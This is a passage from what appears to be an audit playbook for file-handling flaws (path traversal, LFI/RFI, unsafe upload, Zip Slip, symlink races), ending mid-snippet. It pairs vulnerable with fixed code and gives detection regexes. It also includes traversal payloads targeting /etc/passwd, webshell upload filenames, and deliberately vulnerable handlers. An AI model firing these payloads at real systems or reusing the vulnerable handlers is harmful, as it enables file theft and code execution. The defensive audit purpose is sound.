---
name: file-handling-checks
description: Audit playbook module for detecting path traversal, LFI/RFI, unsafe file upload/download/delete, Zip Slip and archive attacks, symlink/TOCTOU races, and storage-key confusion via static taint tracing and authorized reproduction.
category_slug: FILE
cwe: [CWE-22, CWE-434, CWE-23]
owasp: A01:2021 – Broken Access Control
---

# File-Handling Checks (FILE)

## Scope & Objectives

- Detect every class where attacker-controlled input influences a filesystem path or archive entry name: path traversal (CWE-22/CWE-23), absolute-path injection (CWE-36), external control of file name/path passed to any sink (CWE-73), PHP include/require of remote or wrapper-controlled files (CWE-98), and unrestricted upload of dangerous file types (CWE-434).
- Cover these vulnerability families end to end:
  - **Path traversal** in read, write, download, delete, include, and template-resolution sinks.
  - **LFI/RFI**: dynamic `include`/`require`/`import`/user-control resolution driven by request data, including PHP stream-wrapper abuse.
  - **Arbitrary file upload**: extension/MIME/magic/filename validation gaps, landing-directory executability, `.htaccess`/`.config` overwrite, polyglot files, traversal-in-filename.
  - **Arbitrary file download/read**: export/report/invoice/attachment endpoints mapping IDs or names to paths.
  - **Arbitrary file deletion** (`unlink`/`File.delete`/`os.Remove`) enabling config-wipe-to-reset chains.
  - **Archive extraction**: Zip Slip (CWE-23 via entry names), tar symlink attacks, partial-overwrite attacks; decompression-amplification itself is scored under CWE-409 and detailed in the DOS module (cross-ref DOS).
  - **Symlink and race issues**: predictable temp names, `mktemp` misuse, TOCTOU between containment check and open (cross-ref LOGIC for business-flow impact).
  - **Storage-layer notes**: S3/GCS keys built from user input, overbroad signed-URL scopes. Deep cloud misconfiguration stays in CONFIG (cross-ref CONFIG).
- Languages in scope: JavaScript/TypeScript (Express/Fastify/Koa, multer), Python (Flask/Django/FastAPI, stdlib `zipfile`/`tarfile`), Java/Kotlin (Spring, jakarta.servlet, java.nio/java.util.zip/Apache Commons Compress), C# (ASP.NET Core), PHP (raw/Laravel/Symfony), Ruby (Rails, paperclip/carrierwave/shrine/Active Storage), Go (net/http standard library).
- Deliverables per finding: sink location, tainted source, join/normalization chain, correctness verdict on any existing containment check, exploitability rating from static reasoning, and a concrete fix.
- Assume code-read access only. The curl procedures below are for authorized lab verification against systems you are explicitly permitted to test; never fire payloads at production during a static audit.
- Out of scope here: stored XSS served from uploaded SVG/HTML payloads (cross-ref WEB), zip-bomb resource math (cross-ref DOS), bucket policies/IAM (cross-ref CONFIG), business-logic consequences of TOCTOU (cross-ref LOGIC).

## Mental Model

Every file-handling bug answers two questions:

1. **Does attacker input reach a filesystem path?** Any portion counts: whole path, subdirectory segment, filename, extension, or an ID that the app naively concatenates into a path.
2. **After ALL normalization layers run, does the final resolved path stay inside the intended root?** The kernel resolves symlinks late; frameworks decode percent-encoding early; string filters see only one layer.

### Path algebra by language

Joining functions do NOT behave identically. An attacker who submits an absolute path exploits this immediately:

| Language / API | Expression | Result | Absolute-path injection? |
|---|---|---|---|
| Node | `path.join('/var/data', '/etc/passwd')` | `/var/data/etc/passwd` | No |
| Node | `path.resolve('/var/data', '/etc/passwd')` | `/etc/passwd` | YES |
| Python | `os.path.join('/var/data', '/etc/passwd')` | `/etc/passwd` | YES |
| Python | `Path('/var/data') / '/etc/passwd'` | `PosixPath('/etc/passwd')` | YES |
| Java/Kotlin | `Paths.get("/var/data").resolve("/etc/passwd")` | `/etc/passwd` | YES |
| C# | `Path.Combine(@"C:\data", "/etc/passwd")` | `/etc/passwd` (rooted arg wins) | YES |
| Go | `filepath.Join("/var/data", "/etc/passwd")` | `/var/data/etc/passwd` | No (but `..` still applies) |
| Ruby | `File.join('/var/data', '/etc/passwd')` | `/var/data/etc/passwd` | No (but `File.expand_path` flips it) |

Traversal cancels components: `base + '/../secret'` escapes one level per `../`. On Windows, `\` is also a separator, so `..\..\boot.ini` works there even when the filter strips only `/`. On POSIX, `\` is a legal filename character and does nothing.

### Layered decoding: who normalizes what

| Layer | Behavior you must assume |
|---|---|
| Browser / fetch | Collapses `../` inside the URL *path* before sending; leaves `%2e%2e%2f` encoded inside query values untouched |
| curl | Collapses `../` unless you pass `--path-as-is`; use that flag when testing |
| nginx | Decodes `%XX` once for routing; `merge_slashes on` by default; does not re-decode `%252e` |
| Tomcat / Spring MVC | Rejects encoded slashes in the path by default post-hardening defaults; decodes query parameters once |
| Express / Flask / Django / Rails | Decode query and body values exactly once; `%2e%2e%2f` arrives as `../`; `%252e%252e%252f` arrives as `%2e%2e%2f` |
| Application-level custom filters | Often strip literal `../` but not encoded forms; double-decoding happens only if the app calls a second decode (e.g., `decodeURIComponent`, `urldecode`, `URLDecoder.decode`) |
| Kernel / libc | Resolves symlinks and `.`/`..` at `open()` time; sees only the final byte string after all app layers |

Consequence: a filter that rejects `../` is bypassed by `%2e%2e%2f` if it runs *after* framework decoding; a check that runs *before* decoding is bypassed by encoding. Double-encoded payloads matter only where two decodes occur.

### Primitives by sink type

- **Read sinks** (`fs.readFile`, `open()`, `Files.newInputStream`, `File.ReadAllText`, `file_get_contents`, `readfile`, `ioutil.ReadFile`, `send_file`) give arbitrary read → source code, configs, `/etc/passwd`, SSH keys.
- **Include/eval sinks** (`include $_GET[...]`, dynamic `require()`, `importlib`, JSP `<jsp:include>` with variables) turn read into execution → Critical.
- **Write sinks** (upload handlers, `fs.createWriteStream`, `move_uploaded_file`) give persistence; impact = executability of the landing zone × content control.
- **Delete sinks** (`unlink`, `File.delete`, `os.Remove`, `rm -rf` built from paths) give integrity damage; deleting session/config/state can reset auth state (chain to AUTHN findings).
- **Serve sinks** (`res.sendFile`, `http.ServeFile`, `X-Accel-Redirect`) combine read with delivery to the attacker.

**Detection vs exploitation:** statically prove constructability — show attacker bytes reach the sink, enumerate normalization between them, and predict what the final path resolves to. Fire live probes only in authorized labs.

**Second-order rule:** filenames stored in the database are propagators, not sources-turned-safe. A filename uploaded today and concatenated into a backup/export/archive path next month is still tainted. Trace to origin.

## What To Check

### Path traversal in read/write/serve paths

1. Enumerate every endpoint that takes a name, path, ID, folder, or "report"/"export" parameter and touches disk.
2. For each site, reconstruct the exact expression producing the final path: which function joins, whether user data is a full component or a suffix, whether any normalize/resolve/clean call happens before or after the join.
3. Flag joins where user input lands as ANY argument of `os.path.join`, `path.join`, `path.resolve`, `Paths.get().resolve`, `Path.Combine`, `filepath.Join`, `File.join`, string `+`, f-string/template-literal interpolation into a path variable.
4. Check containment logic for these specific defects:
   - Compare before decode (encoded payloads pass).
   - `startsWith(base)` without trailing separator: `base="/var/up"` accepts candidate `/var/uploads-attacker/x`.
   - No case-insensitive comparison on Windows/macOS targets (`BASE.TXT` vs `base.txt`).
   - `realpath`/`resolve` called AFTER opening the file, or result discarded.
   - Symlink never resolved: check passes on the lexical path while `candidate -> /etc/shadow`.
   - Blacklist filtering (`replace('../','')`) instead of canonicalization: defeated by `....//`, `..././`, `../` repeated, backslashes on Windows.
   - Extension allowlist checked on the ORIGINAL name while the SAVED name derives from it separately.
5. Inspect static-serving configuration for roots that include application directories: `express.static(path.join(__dirname))`, `app.use(express.static('.'))`, nginx `root /srv/app;` aliasing config dirs, Go `http.FileServer(http.Dir("."))`, Spring `addResourceHandlers("/**", ...)` mapped at application root, Django serving `MEDIA_ROOT = BASE_DIR`.
6. Check template/include loaders configured with user-reachable name spaces: Jinja2 `FileSystemLoader(searchpath=request-derived)`, Twig `FilesystemLoader` with user-chosen namespace roots, JSP `RequestDispatcher.forward(userInput + ".jsp")`, ASP.NET `RenderPartial(userControlName)`.

### LFI / RFI

1. Grep PHP for variable-driven includes: `include $x`, `require $x`, `include($_GET['page'])`. Classify each:
   - Directly request-controlled with no allowlist → flag Critical (wrapper-capable).
   - Concatenated with fixed suffix (`$page . '.php'`) → still flag; null-byte truncation applied on PHP < 5.3.4 (historical), but wrapper syntax `php://filter/...resource=` survives suffixes via crafted resource strings only when no suffix is appended — verify per-site.
   - Switch/allowlist mapping to constants → safe, note as compensating control.
2. Confirm RFI preconditions: `allow_url_fopen=On` (default On historically, commonly Off on modern hardened hosts) for wrappers like `http://`; `allow_url_include=On` (default Off since PHP 5.2) required for `include 'http://...'` and `data://`. Mark RFI findings conditional on php.ini evidence found in repo (`php.ini*`, Dockerfiles, `docker-php-ext`, ini snippets).
3. Inventory Python dynamic import/exec surfaces: `importlib.import_module(userInput)`, `importlib.util.spec_from_file_location(name, userPath)`, `__import__(userInput)`, `exec(open(userPath).read())`, plugin loaders scanning user-writable dirs.
4. Inventory JVM/.NET include analogues: JSP `<jsp:include page="<%=request.getParameter(\"p\")%>">`, `application.getRequestDispatcher(userPath).forward(...)`, Spring `InternalResourceViewResolver` prefix+viewname-from-request patterns, ASP.NET `LoadControl("~/controls/" + Request["uc"] + ".ascx")`, Razor dynamic partial resolution.
5. Node: flag non-literal `require(variable)` and `await import(variable)`; CommonJS `require` of a user path executes module code; `import()` likewise. Also flag template engines resolving user-named templates from disk (`app.set('view engine')` + `res.render(req.params.tpl)`).
6. For each LFI confirmed reachable, record which stream wrappers apply so reproduction uses the correct one (see payload cheat-sheet); classify `zip://`, `phar://` (relevant mainly for deserialization chains), `expect://` (needs PECL expect extension), `data://` (needs `allow_url_include`) as historical-or-conditional vs `php://filter` as still fully relevant with no special settings.

### Arbitrary file upload

1. Locate every multipart handler: multer single/array/fields, busboy, formidable, Django `request.FILES`, Flask `request.files`, FastAPI `UploadFile`, Spring `MultipartFile`, ASP.NET `IFormFile`, PHP `$_FILES` + `move_uploaded_file`, Rails `ActionDispatch::Http::UploadedFile`, Go `r.FormFile`, carrierwave/paperclip/shrine/Active Storage uploaders.
2. Audit the validation chain and demand ALL THREE legs:
   - Extension allowlist (never blacklist): blacklist `.php` misses `.php5`, `.phtml`, `.phar`, `.pht`; blacklist `.aspx` misses `.ashx`, `.asmx`, `.ascx`, `.svc`; case variants `.PHP`, `.Php` defeat lowercase comparisons; double extensions `.php.jpg` land depending on server multi-extension handling (Apache with `AddHandler php` + multiviews-style behavior).
   - Declared MIME checked against allowlist (client-controlled alone — worthless, but its absence signals zero effort).
   - Magic bytes verified server-side: python-magic/libmagic, npm `file-type`, Apache Tika, .NET `UrlMon`/Mime sniffing libs, Go `net/http.DetectContentType` (limited set).
3. Trace the on-disk filename decision. Flag:
   - `filename(cb) { cb(null, req.file.originalname) }` in multer diskStorage (traversal-in-filename `../../shell.php`, absolute paths, NUL bytes historical).
   - `move_uploaded_file($_FILES['f']['tmp_name'], $dir . '/' . $_FILES['f']['name'])`.
   - `Path.Combine(dir, file.FileName)` in ASP.NET Core with raw client name.
   - Unicode normalization asymmetries: client sends NFC/NFD or fullwidth lookalikes that survive filters but collapse differently on the target FS.
4. Determine the landing directory: inside webroot? Inside a dir served with script handlers? Writable by the app user AND listable? Check for missing deny rules for `.htaccess`, `.user.ini`, `web.config`, `.config` uploads — overwriting these changes handler mappings (Apache `AddType`, PHP `.user.ini` auto_prepend).
5. Check image pipelines: if images are accepted, is there re-encoding (Pillow save, sharp convert, ImageMagick with policy hardening)? Re-encoding destroys embedded payloads; passthrough storage preserves them (polyglot GIFAR concept — GIF header + script content). ImageMagick installs get a hardened `policy.xml` explicitly disabling the coder classes behind ImageTragick: `<policy domain="coder" rights="none" pattern="MVG"/>` and the same for `MSL`, `URL`, `FILE`, `EPHEMERAL` (path `/etc/ImageMagick-6/policy.xml` or the v7 equivalent).
6. Check size limits enforced BEFORE buffering/streaming to disk, and per-file + total quota enforcement.
7. Verify uploaded files are not made executable: mode bits (0600/0640 expected), mount flags (`noexec` in docker-compose/systemd mounts), container layer writable-by-app separation.

### Arbitrary file download / read endpoints

1. Hunt report/invoice/export/receipt/attachment/log-download features taking `filename`, `name`, `file`, `path`, `id` params. Map each to its disk lookup.
2. Flag ID-based lookups that interpolate the ID into a path without validation (`/reports/{id}/download` → `Path.Combine(reportsDir, id + ".pdf")` with unvalidated `id`).
3. Check attachment handling for header injection too (`Content-Disposition` built from client filename — cross-ref WEB for response splitting).
4. Verify range-request/zip-batch features ("download all as zip") don't let users reference arbitrary server paths as batch members.

### File deletion

1. Grep deletion sinks fed by request data: `fs.unlink/unlinkSync/rm`, `os.remove/os.unlink/shutil.rmtree`, `Files.delete/deleteIfExists`, `File.Delete`, `unlink()`, `File.delete`, `os.Remove`, shell-outs (`rm`, `del`) built from strings.
2. Assess chain value: deleting config/session/storage markers can force password resets, re-provisioning, or unlock admin flows. Deleting log files aids anti-forensics. Rate accordingly.
3. Flag `shutil.rmtree(userPath)` and recursive deletes with user influence especially — one component difference deletes directory trees.

### Symlink & race issues

1. Find temp-file creation: `tempfile.mktemp` (insecure by design — TOCTOU between name generation and open), `tmpnam`, hardcoded `/tmp/app_buffer`, `File.createTempFile` followed by manual writes with default perms, `ioutil.TempFile` misused with shared directories and predictable patterns.
2. Flag check-then-use sequences: `if File.exists(p) then open(p)`, `if !strings.Contains(p,'..') then fs.readFile(p)`, permission check then open — anything between validate and use is a race window (cross-ref LOGIC for flow impact).
3. In shared/multi-user dirs (upload pools, spool dirs), check whether the code follows symlinks when reading/writing user-placed entries (`os.Open` follows; `O_NOFOLLOW` absent; `Files.newInputStream` without `LinkOption.NOFOLLOW_LINKS`).
4. Archive-extraction symlink handling is covered in the extraction loops section — flag extractors that create symlinks from tar entries verbatim.

### Storage-layer notes (brief)

1. Flag S3/GCS key construction by direct interpolation: `Key: userId + "/" + filename`, `blobClient := container.GetBlobClient(userInput)`. Even though object stores have flat namespaces, attacker-set keys enable overwrite of other tenants' objects when the tenant prefix comes from input, and prefix/listing confusion when keys collide.
2. Flag signed-URL generation with overbroad scope: signing `s3://bucket/*` or long-lived presigned GETs for whole prefixes instead of one key. Deep cloud config belongs to CONFIG (cross-ref CONFIG).

## Where To Look

### High-yield locations

| Location | What to expect |
|---|---|
| Routes/controllers named download, export, report, invoice, receipt, attachment, media, asset, static, file, document | Traversal read/serve sinks |
| Upload controllers, multipart middleware setup, uploader classes (carrierwave, paperclip, shrine, Active Storage, multer config, PHP move handlers) | Upload validation chain and landing zone |
| Template/view bootstrap: Jinja env, Twig loader, JSP config, view resolvers, partial-render helpers | User-controlled template/include names |
| Static-serving wiring: express.static, koa-send, nginx conf in repo, http.FileServer, Spring resource handlers, Django urls + STATIC/MEDIA settings | Misconfigured roots, follow-symlinks options |
| Import/export jobs, backup scripts, cron scripts, CLI tools sharing helpers with web code | Same taint reaching more dangerous sinks (rmtree, rm -rf) |
| Archive processing: importers, migration tools, avatar bundles, "restore from backup" | Zip Slip / tar symlinks |
| Temp usage in PDF/image/video processing pipelines | Predictable names, races |
| Config: php.ini fragments, docker-compose volumes, nginx/apache conf committed to repo | Preconditions for RFI/wrapper abuse, executable upload dirs |

### Ripgrep starting points

Run from repo root; add `-g '!vendor' -g '!node_modules'` style excludes as needed. Every pattern below is ripgrep-compatible.

```regex
# Serve/download sinks fed anything
(res\.sendFile|res\.download|koa-send|ctx\.download)\s*\(
```

```regex
# Python file-open sinks fed non-literals (variables/interpolation)
open\s*\(\s*[A-Za-z_][A-Za-z0-9_.\[\]'"]*
```

```regex
# Python file-serve sinks
(send_file\s*\(|FileResponse\s*\(|send_from_directory\s*\()
```

```regex
(send_file|FileResponse|send_from_directory)\s*\(
```

```regex
# Java/Kotlin file APIs
(Paths\.get\s*\(|new\s+(File|FileReader|FileWriter|FileInputStream|FileOutputStream|RandomAccessFile)\s*\(|Files\.(newInputStream|newOutputStream|readAllBytes|readAllLines|delete|deleteIfExists|copy|createTempFile)\s*\()
```

```regex
# C# file APIs
(File\.(ReadAllText|ReadAllBytes|ReadAllLines|Open|OpenRead|OpenWrite|Delete|WriteAllBytes|Copy|Move)|Directory\.(Delete|GetFiles)|Path\.Combine)\s*\(
```

```regex
# PHP include/read/upload/delete sinks (variable-driven)
\b(include|require)(_once)?\s*\(?\s*\$
```

```regex
(fopen|file_get_contents|readfile|unlink|rmdir|fopen\(|move_uploaded_file)\s*\(
```

```regex
# Ruby file sinks
(File\.(read|open|binread|delete|unlink|exist?)|IO\.(read|binread)|FileUtils\.(rm|rm_rf|cp|mv)|send_data|x_send_file)\b
```

```regex
# Go file sinks
(os\.(Open|OpenFile|ReadFile|Create|Remove|RemoveAll|Rename)|ioutil\.(ReadFile|WriteFile)|http\.ServeFile|filepath\.Join)\s*\(
```

```regex
# Join-with-user-input heuristic (tune token list per codebase)
(join|Combine|resolve)\s*\([^)]*(req\.|request\.|params\[|\$_GET|\$_POST|\$_FILES|query\.|form\.|args\.|c\.Query|c\.Param)[^)]*\)
```

```regex
# Upload machinery
(multer|diskStorage|busboy|formidable|UploadFile|MultipartFile|IFormFile|\$_FILES|move_uploaded_file|ActiveStorage|carrierwave|paperclip|shrine|FormFile\(\))
```

```regex
# Dynamic include/import/require
(require\s*\(\s*[A-Za-z_$]|await\s+import\s*\(|importlib\.(import_module|util)|__import__\s*\(|exec\s*\(\s*open)
```

```regex
# Template loaders and view resolution
(FileSystemLoader|Twig\\\\?Loader|FilesystemLoader|setTemplateLoader|ViewResolver|getRequestDispatcher|LoadControl|renderPartial|res\.render\s*\()
```

```regex
# Archive extraction
(zipfile\.ZipFile|tarfile\.open|ZipInputStream|ZipFile\(|ZipArchive|extractTo|ExtractToFile|unzip\s|tar\s+-x|Compress\\ZipFile|archive\.Extract)
```

```regex
# Temp files and predictable names
(mktemp|tempfile\.(mktemp|NamedTemporaryFile|mkstemp)|tmpnam|TempFile|CreateTempFile|GetTempFileName|\/tmp\/[A-Za-z_])
```

```regex
# Traversal attempts worth hunting in committed fixtures/logs/tests (indicates known-paths handling)
(\.\.\/|%2e%2e(%2f|%5c)?|\.\.%2f|\.\.%5c|%252e)
```

```regex
# Cloud storage key construction
(s3\.(get_object|put_object|upload_file)|getObject\s*\(|PutObject|storage\.bucket\(\)|blob_client|GetBlockBlobReference|upload_from_string|Key\s*[:=])
```

## Patterns & Signatures

### Dangerous vs safe call table

| Language/API | Dangerous call | Safe alternative |
|---|---|---|
| JS/TS (Node/Express) | `res.sendFile(req.query.name)`, `res.download(base + name)`, `fs.readFile(base + name)`, multer `filename: (req,f,cb)=>cb(null,f.originalname)` | `path.resolve` + strict prefix check, or ID→DB row→server-generated storage name; multer random `crypto.randomBytes(16).toString('hex')` names |
| Python (Flask/Django/FastAPI) | `open(BASE + request.args['f'])`, `send_file(f'{BASE}/{name}')`, `shutil.rmtree(userPath)`, `tarfile.open(...).extractall(dest)` | `pathlib` resolve + `relative_to(BASE)` guard; ID lookup; manual validated extraction loop |
| Java/Kotlin | `new File(base, userInput)`, `base.resolve(input)`, `Files.copy(zis, dest.resolve(entry.getName()))`, `new File(request.getParameter("f"))` | `base.resolve(input).normalize()` then `startsWith(base)` plus `toRealPath()` recheck; validated ZipInputStream loop |
| C# | `Path.Combine(root, userInput)` unchecked, `File.ReadAllText(candidate)`, `PhysicalFile(candidate,...)` unchecked, `Path.Combine(root, file.FileName)` on upload | `Path.GetFullPath` + rooted-prefix compare with separator and `OrdinalIgnoreCase`; random storage names |
| PHP | `include $_GET['page'];`, `readfile($dir . $_GET['f']);`, `move_uploaded_file($tmp, $dir . $_FILES['f']['name']);`, `unlink($dir . $_GET['name']);` | Allowlist switch to constants; `realpath` + `str_starts_with` containment; random stored names via DB metadata |
| Ruby | `File.read(params[:path])`, `send_data File.read("#{DIR}/#{params[:name]}")`, ` FileUtils.rm_rf(user_path)`, carrierwave `store_dir` interpolating user params | ID→model→stored-name lookup; frozen constant store_dir; validated expand_path containment |
| Go | `http.ServeFile(w, r, r.URL.Query().Get("f"))`, `os.Open(filepath.Join(base, name))` unchecked, `filepath.Walk` + `os.RemoveAll` on user dir | `filepath.Rel` containment + `EvalSymlinks` recheck before open; ID lookup |

### Vulnerable vs fixed snippets per family

#### Path traversal — JavaScript/TypeScript

```javascript
// VULNERABLE
app.get('/reports/:name', (req, res) => {
  res.sendFile(path.join(__dirname, 'reports', req.params.name));
});
// path.join keeps attacker segments: /reports/..%2f..%2fconfig/secrets.json
```

```javascript
// FIXED
const BASE = path.resolve(__dirname, 'reports');

function safeResolve(userSegment) {
  const candidate = path.resolve(BASE, userSegment);
  if (candidate !== BASE && !candidate.startsWith(BASE + path.sep)) {
    throw new Error('Path escapes reports root');
  }
  return candidate;
}

app.get('/reports/:id', async (req, res) => {
  const meta = await db.findReport(req.params.id);      // opaque ID -> metadata
  if (!meta || meta.ownerId !== req.user.id) return res.sendStatus(404);
  res.setHeader('Content-Disposition',
    `attachment; filename="${encodeURIComponent(meta.displayName)}"`);
  res.sendFile(safeResolve(meta.storageName));          // server-generated name
});
```

#### Path traversal — Python

```python
# VULNERABLE
@app.route('/download')
def download():
    name = request.args.get('name')
    return send_file(os.path.join(UPLOADS, name))       # ../../etc/passwd escapes
```

```python
# FIXED
from pathlib import Path

BASE = Path(app.config["UPLOADS"]).resolve()

def safe_resolve(name: str) -> Path:
    candidate = (BASE / name).resolve()                 # resolve() collapses .. and symlinks
    try:
        candidate.relative_to(BASE)
    except ValueError:
        raise PermissionError("path escapes uploads root")
    if not candidate.is_file():
        raise FileNotFoundError(name)
    return candidate

@app.route('/download/<doc_id>')
def download(doc_id):
    doc = Document.query.get_or_404(doc_id)             # ID -> metadata
    if doc.owner_id != g.user.id:
        abort(404)
    return send_file(safe_resolve(doc.storage_name),
                     as_attachment=True,
                     download_name=doc.display_name)
```

#### Path traversal — Java/Kotlin

```java
// VULNERABLE
@GetMapping("/files")
public ResponseEntity<Resource> get(@RequestParam String name) throws IOException {
    Path p = Paths.get("/srv/app/files").resolve(name); // absolute input replaces base
    return ResponseEntity.ok(new FileSystemResource(p));
}
```

```java
// FIXED
private static final Path BASE =
    Paths.get("/srv/app/files").toAbsolutePath().normalize();

private Path safeResolve(String userInput) throws IOException {
    Path candidate = BASE.resolve(userInput).normalize();
    if (!candidate.startsWith(BASE)) {
        throw new SecurityException("Path escapes files root");
    }
    Path real = candidate.toRealPath();                 // follow symlinks NOW, re-check
    if (!real.startsWith(BASE.toRealPath())) {
        throw new SecurityException("Symlink escape");
    }
    return real;
}
```

#### Path traversal — C#

```csharp
// VULNERABLE
public IActionResult Get(string name)
{
    var p = Path.Combine(_env.ContentRootPath, "App_Data", name); // rooted name wins
    return PhysicalFile(p, "application/octet-stream");
}
```

```csharp
// FIXED
private readonly string _root;

public FilesController(IHostEnvironment env)
{
    _root = Path.GetFullPath(Path.Combine(env.ContentRootPath, "App_Data"));
}

public IActionResult Get(string name)
{
    var candidate = Path.GetFullPath(Path.Combine(_root, name));
    var inside = candidate.StartsWith(
        _root + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase);
    if (!inside && !string.Equals(candidate, _root, StringComparison.OrdinalIgnoreCase))
        return BadRequest("Invalid path");
    return PhysicalFile(candidate, "application/octet-stream",
        Path.GetFileName(candidate));
}
```

#### Path traversal — PHP

```php
// VULNERABLE
$page = $_GET['page'];
include $page;                                          // wrappers + ../ both work
```

```php
// FIXED: allowlist-first; never pass user bytes to include
$pages = ['home' => __DIR__ . '/pages/home.php',
          'about' => __DIR__ . '/pages/about.php'];
$key = $_GET['page'] ?? 'home';
if (!isset($pages[$key])) {
    http_response_code(404);
    exit('Unknown page');
}
include $pages[$key];
```

```php
// VULNERABLE (download variant)
$name = $_GET['name'];
readfile('/srv/app/reports/' . $name);
```

```php
// FIXED (download variant)
$base = realpath('/srv/app/reports');
$candidate = realpath($base . DIRECTORY_SEPARATOR . ($_GET['name'] ?? ''));
if ($candidate === false
    || !str_starts_with($candidate, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(400);
    exit('Invalid path');
}
header('Content-Type: application/pdf');
header('Content-Disposition: attachment; filename="' . basename($candidate) . '"');
readfile($candidate);
// realpath() already resolved symlinks, so this comparison also blocks link escapes
```

#### Path traversal — Ruby

```ruby
# VULNERABLE
get '/attachments/:name' do
  send_data File.read(File.join('attachments', params[:name]))
end
```

```ruby
# FIXED
STORAGE_ROOT = File.realpath(File.expand_path('../storage/attachments', __dir__))

def safe_path(name)
  candidate = File.expand_path(File.join(STORAGE_ROOT, name.to_s))
  raise ArgumentError, 'escapes root' unless candidate.start_with?(STORAGE_ROOT + File::SEPARATOR)
  candidate = File.realpath(candidate) # Errno::ENOENT if missing; resolves links
  raise ArgumentError, 'symlink escape' unless candidate.start_with?(STORAGE_ROOT + File::SEPARATOR)
  candidate
end

get '/attachments/:id' do
  att = Attachment[params[:id]] || halt(404)
  halt(404) unless att.account_id == current_account.id
  content_type att.mime_type
  attachment att.display_name
  File.binread(safe_path(att.storage_name))
end
```

#### Path traversal — Go

```go
// VULNERABLE
func download(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("f")
    http.ServeFile(w, r, filepath.Join("/srv/app/docs", name))
}
```

```go
// FIXED
func safeJoin(base, name string) (string, error) {
    baseAbs, err := filepath.Abs(base)
    if err != nil {
        return "", err
    }
    candidate := filepath.Clean(filepath.Join(baseAbs, name)) // Clean collapses ..
    rel, relErr := filepath.Rel(baseAbs, candidate)
    if relErr != nil || rel == ".." ||
        strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
        return "", errors.New("path escapes docs root")
    }
    // Symlink hardening: resolve everything and compare again.
    realBase, err := filepath.EvalSymlinks(baseAbs)
    if err != nil {
        return "", err
    }
    real, err := filepath.EvalSymlinks(candidate)
    if err != nil {
        return "", err
    }
    if real != realBase &&
        !strings.HasPrefix(real, realBase+string(filepath.Separator)) {
        return "", errors.New("symlink escape")
    }
    return candidate, nil
}

func download(w http.ResponseWriter, r *http.Request) {
    doc, err := store.ByID(r.URL.Query().Get("id"))     // ID -> metadata
    if err != nil || !doc.OwnedBy(r.Context().User()) {
        http.Error(w, "not found", http.StatusNotFound)
        return
    }
    p, err := safeJoin("/srv/app/docs", doc.StorageName)
    if err != nil {
        http.Error(w, "invalid path", http.StatusBadRequest)
        return
    }
    w.Header().Set("Content-Disposition",
        "attachment; filename=\""+template.JSEscapeString(doc.Display)+"\"")
    http.ServeFile(w, r, p)
}
```

### Upload validation — vulnerable vs fixed

```javascript
// VULNERABLE
const upload = multer({
  storage: multer.diskStorage({
    destination: 'public/uploads/',                    // inside webroot, served statically
    filename: (req, file, cb) => cb(null, file.originalname) // attacker-controlled name
  }),
  fileFilter: (req, file, cb) => {                     // blacklist + MIME-only
    const bad = ['.php', '.exe', '.jsp'];
    cb(!bad.some(e => file.originalname.endsWith(e)), 'Blocked');
  }
});
```

```javascript
// FIXED
const crypto = require('crypto');
const ALLOWED = new Set(['image/png', 'image/jpeg', 'image/gif']);
const EXT_FOR = { 'image/png': '.png', 'image/jpeg': '.jpg', 'image/gif': '.gif' };

const upload = multer({
  storage: multer.diskStorage({
    destination: '/var/app-storage/uploads',           // outside webroot, noexec mount
    filename: (req, file, cb) =>
      cb(null, crypto.randomBytes(16).toString('hex') + EXT_FOR[file.mimetype])
  }),
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => cb(ALLOWED.has(file.mimetype))
});

app.post('/avatar', upload.single('avatar'), async (req, res) => {
  const ft = await fileTypeFromFile(req.file.path);    // magic-byte check (npm file-type)
  if (!ft || !ALLOWED.has(ft.mime)) {
    fs.unlinkSync(req.file.path);
    return res.status(400).json({ error: 'content is not an allowed image' });
  }
  const out = req.file.path + '.reenc';                // re-encode strips payloads
  await sharp(req.file.path).resize(512, 512).png().toFile(out);
  fs.unlinkSync(req.file.path);
  fs.renameSync(out, req.file.path);
  await db.saveAvatar(req.user.id, req.file.filename); // DB holds name + original label
  res.json({ id: req.user.id });
});
```

```php
// VULNERABLE
$dst = $_SERVER['DOCUMENT_ROOT'] . '/uploads/' . $_FILES['f']['name'];
move_uploaded_file($_FILES['f']['tmp_name'], $dst);    // name passthrough + webroot
```

```php
// FIXED
$allow = ['image/jpeg' => 'jpg', 'image/png' => 'png'];
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['f']['tmp_name']);
if (!isset($allow[$mime])) {
    http_response_code(400);
    exit('type not allowed');
}
$stored = bin2hex(random_bytes(16)) . '.' . $allow[$mime];
$dst = '/var/app-storage/uploads/' . $stored;          // outside webroot, random name
move_uploaded_file($_FILES['f']['tmp_name'], $dst);
chmod($dst, 0640);
$db->insert('uploads', [
    'user_id' => $uid, 'orig_name' => $_FILES['f']['name'], 'stored_name' => $stored,
]);
echo json_encode(['id' => $db->lastInsertId()]);
```

### Safe archive extraction loops (Zip Slip / tar symlinks)

Python (stdlib zipfile):

```python
# VULNERABLE
with zipfile.ZipFile(uploaded) as zf:
    zf.extractall("/srv/app/imports")                   # entry "../x" escapes
```

```python
# FIXED
import os
import zipfile
from pathlib import Path

MAX_TOTAL_BYTES = 1 << 30  # 1 GiB decompressed budget (also blunts zip bombs)

def extract_zip(zf: zipfile.ZipFile, dest: Path) -> None:
    dest = dest.resolve()
    written = 0
    for info in zf.infolist():
        target = (dest / info.filename).resolve()
        if target != dest and dest not in target.parents:
            raise ValueError(f"entry escapes destination: {info.filename}")
        if info.is_dir():
            target.mkdir(parents=True, exist_ok=True)
            continue
        if target.is_symlink():
            target.unlink()                             # archives must not plant links
        target.parent.mkdir(parents=True, exist_ok=True)
        with zf.open(info) as src, open(target, "wb") as out:
            while chunk := src.read(65536):
                written += len(chunk)
                if written > MAX_TOTAL_BYTES:
                    raise ValueError("decompression budget exceeded")
                out.write(chunk)
```

Java (java.util.zip):

```java
// VULNERABLE
try (ZipInputStream zis = new ZipInputStream(in)) {
    ZipEntry e;
    while ((e = zis.getNextEntry()) != null) {
        File out = new File(destDir, e.getName());      // "../" honored by File parenting
        Files.copy(zis, out.toPath(), StandardCopyOption.REPLACE_EXISTING);
    }
}
```

```java
// FIXED
Path base = Paths.get(destDir).toAbsolutePath().normalize();
try (ZipInputStream zis = new ZipInputStream(in)) {
    ZipEntry e;
    byte[] buf = new byte[65536];
